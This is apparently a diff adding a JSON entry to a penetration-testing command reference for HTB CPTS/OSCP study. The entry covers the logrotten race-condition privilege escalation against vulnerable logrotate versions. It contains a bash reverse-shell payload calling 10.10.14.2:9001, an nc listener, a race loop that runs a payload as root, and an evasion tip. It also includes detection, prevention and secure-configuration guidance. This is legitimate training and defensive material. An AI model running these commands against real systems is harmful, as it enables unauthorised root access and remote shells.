@@ -1,0 +1,121 @@
+{
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "logrotten",
+    "gcc",
+    "nc"
+  ],
+  "tags": [
+    "logrotate",
+    "logrotten",
+    "race-condition"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Linux - Logrotate",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 25: Linux Privilege Escalation",
+  "examples": [
+    {
+      "label": "Check logrotate uses 'create' mode (required for exploit)",
+      "command": "grep \"create\\|compress\" /etc/logrotate.conf | grep -v \"#\""
+    },
+    {
+      "label": "Find writable log files",
+      "command": "find / -writable -name \"*.log\" 2>/dev/null"
+    },
+    {
+      "label": "Reverse-shell payload written for logrotten",
+      "command": "echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload"
+    },
+    {
+      "label": "Start the listener",
+      "command": "nc -nlvp 9001"
+    },
+    {
+      "label": "Win the rotate race to run the payload as root",
+      "command": "./logrotten -p ./payload /tmp/tmp.log"
+    }
+  ],
+  "notes": "Target /etc/bash_completion.d (sourced by every bash login). If root's reset.sh wipes /tmp, write the flag to your home dir instead. Determine mode: grep \"create\\|compress\" /etc/logrotate.conf | grep -v \"#\".",
+  "references": [
+    {
+      "title": "logrotten (whotwagner)",
+      "url": "https://github.com/whotwagner/logrotten"
+    },
+    {
+      "title": "HTB Academy - Linux Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/51"
+    },
+    {
+      "title": "OffSec PEN-200 - Privilege Escalation",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ref-vuln-versions",
+      "note": "Confirm a vulnerable logrotate version first.",
+      "rel": "prereq"
+    },
+    {
+      "id": "linux-enum-world-writable",
+      "note": "Find the writable log that root rotates.",
+      "rel": "prereq"
+    }
+  ],
+  "id": "logrotate-logrotten",
+  "name": "Logrotate - logrotten Exploit",
+  "command": "./logrotten -p ./payload <writable_log>",
+  "description": "Vulnerable logrotate (3.8.6/3.11.0/3.15.0/3.18.0) run as root on a log you can write lets logrotten win a race to execute a payload as root, typically dropped into /etc/bash_completion.d.",
+  "steps": [
+    {
+      "label": "1. Check version + find writable log",
+      "command": "logrotate --version   # 3.11.0 = vulnerable\ncat /etc/logrotate.conf\nfind / -writable -name \"*.log\" 2>/dev/null"
+    },
+    {
+      "label": "2. Build logrotten + payload",
+      "command": "git clone https://github.com/whotwagner/logrotten.git; cd logrotten\ngcc -static logrotten.c -o logrotten_static\necho 'cat /root/flag.txt > /home/htb-student/flag.txt && chmod 644 /home/htb-student/flag.txt' > payload"
+    },
+    {
+      "label": "3. Spam the race loop",
+      "command": "while true; do echo \"x\" >> /home/htb-student/backups/access.log 2>/dev/null; timeout 6 ./logrotten -p ./payload /home/htb-student/backups/access.log 2>/dev/null; sleep 1; done"
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1068"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "logrotten exploits a TOCTOU race condition in logrotate's 'create' directive. When logrotate renames a log file before creating a new one, logrotten uses inotify to detect the rename and replaces the log directory with a symlink to /etc/bash_completion.d. Logrotate then creates the new log file at the symlink target, giving root ownership. The attacker's payload in that file is executed when root next opens a bash login shell.",
+    "prerequisites": "A log file writable by the attacker. logrotate running as root (via cron). logrotate configured with the 'create' directive (not 'copytruncate'). Vulnerable logrotate versions: 3.8.6, 3.11.0, 3.15.0, 3.18.0.",
+    "impact": "Code execution as root when root next logs in via bash. Attacker can read /root/flag.txt, add sudoers entries, install backdoors, or achieve persistent root access.",
+    "detection": "inotify watch on log directories (unusual). Unexpected creation of files in /etc/bash_completion.d by logrotate process. File integrity monitoring on /etc/bash_completion.d. auditd: write to /etc/bash_completion.d by non-root.",
+    "artifacts": "File integrity alert (/etc/bash_completion.d/ modified) | Auditd: logrotate creating file in unexpected path | Payload execution in bash audit log",
+    "prevention": "Update logrotate to a patched version. Use 'copytruncate' instead of 'create' in logrotate configs for attacker-writable log files. Ensure logrotate-handled log directories are not writable by low-privileged users. Apply SELinux policy to restrict logrotate's file creation scope.",
+    "misconfiguration": "Attacker-writable log file (/home/htb-student/backups/access.log) processed by root-run logrotate with the 'create' directive. logrotate version 3.11.0 (vulnerable to race condition).",
+    "vulnerable_config": "# Vulnerable logrotate config\n/home/htb-student/backups/access.log {\n  missingok\n  daily\n  create  # <-- vulnerable directive (use copytruncate instead)\n  rotate 7\n}\n\n# logrotate version\nlogrotate --version\n# logrotate 3.11.0  <- vulnerable",
+    "secure_config": "# Use copytruncate to avoid race condition\n/home/htb-student/backups/access.log {\n  missingok\n  daily\n  copytruncate  # copies then truncates -- no rename race\n  rotate 7\n}\n\n# Ensure log files not writable by non-root\nchown root:root /home/htb-student/backups/access.log\nchmod 640 /home/htb-student/backups/access.log\n\n# Update logrotate\napt install --only-upgrade logrotate",
+    "evasion": "Race window is tiny -- loop logrotten continuously to win the race. Use inotify-based triggering (built into logrotten) for reliable exploitation.",
+    "sources": [
+      "HTB M25",
+      "MITRE T1053.003",
+      "MITRE T1574"
+    ]
+  },
+  "variations": [
+    {
+      "label": "Clone and compile logrotten if binary not available",
+      "command": "git clone https://github.com/whotwagner/logrotten.git\ncd logrotten && gcc logrotten.c -o logrotten"
+    }
+  ]
+}
